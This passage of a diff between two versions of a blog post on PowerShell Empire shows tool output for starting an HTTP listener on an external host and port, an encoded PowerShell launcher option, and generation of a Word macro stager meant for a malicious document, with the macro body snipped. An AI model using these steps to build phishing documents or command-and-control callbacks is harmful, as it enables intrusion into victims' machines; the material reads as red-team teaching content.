+</span></span><span class=line><span class=cl>  Launcher          True        powershell -noP -sta -w <span class=m>1</span> -enc   Launcher string.
+</span></span><span class=line><span class=cl>  <span class=o>[</span>snip<span class=o>]</span>
+</span></span></code></pre></div><p>change the IP & port</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Empire: listeners/http<span class=o>)</span> &gt; <span class=nb>set</span> Host 34.xx.xx.xx
+</span></span><span class=line><span class=cl><span class=o>(</span>Empire: listeners/http<span class=o>)</span> &gt; <span class=nb>set</span> Port <span class=m>9001</span>
+</span></span></code></pre></div><p>finally execute to start listening</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Empire: listeners/http<span class=o>)</span> &gt; execute
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting listener <span class=s1>&#39;http&#39;</span>
+</span></span><span class=line><span class=cl> * Serving Flask app <span class=s2>&#34;http&#34;</span> <span class=o>(</span>lazy loading<span class=o>)</span>
+</span></span><span class=line><span class=cl> * Environment: production
+</span></span><span class=line><span class=cl>   WARNING: This is a development server. Do not use it in a production deployment.
+</span></span><span class=line><span class=cl>   Use a production WSGI server instead.
+</span></span><span class=line><span class=cl> * Debug mode: off
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listener successfully started!
+</span></span></code></pre></div><h2 id=payload-macro-for-bad-document>Payload (Macro for Bad Document)<a hidden class=anchor aria-hidden=true href=#payload-macro-for-bad-document>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Empire<span class=o>)</span> &gt; usestager windows/macro
+</span></span><span class=line><span class=cl><span class=o>(</span>Empire: stager/windows/macro<span class=o>)</span> &gt; info
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Name: Macro
+</span></span><span class=line><span class=cl>...<span class=o>[</span>snip<span class=o>]</span>...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Options:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Name             Required    Value             Description
+</span></span><span class=line><span class=cl>  ----             --------    -------           -----------
+</span></span><span class=line><span class=cl>  Listener         True                          Listener to generate stager <span class=k>for</span>.
+</span></span><span class=line><span class=cl>  Language         True        powershell        Language of the stager to generate.
+</span></span><span class=line><span class=cl>  StagerRetries    False       <span class=m>0</span>                 Times <span class=k>for</span> the stager to retry
+</span></span><span class=line><span class=cl>                                                 connecting.
+</span></span><span class=line><span class=cl>  OutFile          False                         File to output launcher to, otherwise
+</span></span><span class=line><span class=cl>                                                 displayed on the screen
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>... <span class=o>[</span>snip<span class=o>]</span>  ...                                            
+</span></span></code></pre></div><p>set the listener value here</p><pre tabindex=0><code>(Empire: stager/windows/macro) &gt; set Listener http
 (Empire: stager/windows/macro) &gt; execute
 Sub AutoClose()
 	db
@@ -328,247 +146,9 @@ End Sub
 
 Public Function db() As Variant
 [snip]
-</code></pre><h2 id="put-macro-in-word-file">Put Macro in Word File.</h2>
-</article>
-    </section>
-
-    
-
-    
-
-    
-  </div>
-</div>
-
-
-            <footer class="ui basic center aligned segment" style="background-color: transparent;">
-              
-              <p>© 2010 - 2026 Classroom</p>
-              
-
-              
-
-              
-            </footer>
-          </div>
-        </section>
-        <section class="back">
-          <div class="dream-max-width">
-            <header class="ui basic very padded segment dream-header">
-  <div class="ui small circular image">
-    
-    <img src="/img/avatar.jpeg" />
-    
-  </div>
-
-  <div class="content">
-    <h1 class="ui medium header">Reading Stuffs<div class="sub header"></div>
-    </h1>
-
-    <article class="ui horizontal list">
-      
-      <a class="item" href="/categories">
-        <i class="th list icon" title="All Categories"></i>
-      </a>
-      <a class="item" href="/tags">
-        <i class="tags icon" title="All Tags"></i>
-      </a>
-    </article>
-
-  </div>
-</header>
-
-
-<div class="ui relaxed grid dream-grid dream-back">
-  
-  
-  
-
-  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
-    <article class="ui segment">
-      <h3 class="ui header">Social Links</h3>
-      <nav class="ui secondary menu dream-menu dream-socials">
-  
-  <div class="item">
-    <a href="/index.xml">
-      <i class="large rss square icon" title="RSS"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="mailto:classroom@anir0y.in">
-      <i class="large mail icon" title="Email"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://twitter.com/anir0y" target="_blank">
-      <i class="large twitter icon" title="Twitter"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://facebook.com/0xanir0y" target="_blank">
-      <i class="large facebook icon" title="Facebook"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://instagram.com/0xanir0y" target="_blank">
-      <i class="large instagram icon" title="Instagram"></i>
-    </a>
-  </div>
-  
-
-  
-
-  
-  <div class="item">
-    <a href="https://www.linkedin.com/in/anir0y" target="_blank">
-      <i class="large linkedin icon" title="Linkedin"></i>
-    </a>
-  </div>
-  
-
-  
-  <div class="item">
-    <a href="https://github.com/anir0y" target="_blank">
-      <i class="large github icon" title="GitHub"></i>
-    </a>
-  </div>
-  
-
-  
-
-  
-</nav>
-
-    </article>
-  </div>
-
-  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
-    
-    <article class="ui segment">
-      YOU CAN REUSE MY CONTENT
-    </article>
-    
-  </div>
-
-  
-  
-  
-</div>
-
-          </div>
-        </section>
-      </div>
-    </div>
-
-    <script>
-  window.defaultDark =  null 
-  window.backgroundDark = "black"
-  window.backgroundImageDark =  null 
-  window.darkNav =  true 
-  window.hasTwitterEmbed =  true 
-
-  if (window.hasTwitterEmbed) {
-    
-    window.twttr = (function (d, s, id) {
-      var js,
-        fjs = d.getElementsByTagName(s)[0],
-        t = window.twttr || {}
-      if (d.getElementById(id)) return t
-      js = d.createElement(s)
-      js.id = id
-      js.src = 'https://platform.twitter.com/widgets.js'
-      fjs.parentNode.insertBefore(js, fjs)
-
-      t._e = []
-      t.ready = function (f) {
-        t._e.push(f)
-      }
-
-      return t
-    })(document, 'script', 'twitter-wjs')
-  }
-</script>
-<script src="/js/jquery.min.js"></script>
-<script src="/js/semantic.min.js"></script>
-<script src="/js/jquery.overlayScrollbars.min.js"></script>
-<script src="/js/header.js"></script>
-<script src="/js/main.js"></script>
-<script src="/js/theme.js"></script>
-
-    
-<script src="/js/html2canvas.min.js"></script>
-<script src="/js/post.js"></script>
-
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js"></script>
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
-
-
-
-<script>
-  hljs.initHighlightingOnLoad()
-  setHighlightTheme()
-
-  function setHighlightTheme() {
-    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
-    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
-
-    var lightTheme = "tomorrow"
-    var darkTheme = "tomorrow-night"
-    var theme = isDark === 'y' ? darkTheme : lightTheme
-
-    $('link[data-highlight]').attr('href', 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/' + theme + '.min.css')
-    $('pre').css('background', isDark === 'y' ? '#333' : '')
-  }
-</script>
-
-
-
-
-
-    
-    <div class="ui inverted segment" id="dream-search">
-  <div class="ui search">
-    <div class="ui transparent input">
-      <input class="prompt" type="text" placeholder="Search" />
-    </div>
-    <div class="results"></div>
-  </div>
-</div>
-<script>
-  $(document).ready(function () {
-    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
-      $('.ui.search').search({
-        source: data,
-        searchFields: ['title'],
-        showNoResults: true,
-      })
-    })
-  })
-</script>
-<script src="/js/search.js"></script>
-
-    
-
-    
-
-    
-  </body>
-</html>
+</code></pre><h2 id=put-macro-in-word-file>Put Macro in Word File.<a hidden class=anchor aria-hidden=true href=#put-macro-in-word-file>#</a></h2></div><footer class=post-footer><ul class=post-tags><li><a href=https://classroom.anir0y.in/tags/empire/>Empire</a></li></ul><nav class=paginav><a class=prev href=https://classroom.anir0y.in/post/intro-bash/><span class=title>« Prev</span><br><span>Intro Bash</span>
+</a><a class=next href=https://classroom.anir0y.in/post/msfvenom-psh/><span class=title>Next »</span><br><span>Msfvenom Psh</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on x" href="https://x.com/intent/tweet/?text=Powershell%20Empire&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f&amp;hashtags=Empire"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f&amp;title=Powershell%20Empire&amp;summary=Powershell%20Empire&amp;source=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f&title=Powershell%20Empire"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on whatsapp" href="https://api.whatsapp.com/send?text=Powershell%20Empire%20-%20https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on telegram" href="https://telegram.me/share/url?text=Powershell%20Empire&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Powershell Empire on ycombinator" href="https://news.ycombinator.com/submitlink?t=Powershell%20Empire&u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fpowershell-empire-install%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>YOU CAN REUSE MY CONTENT</span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
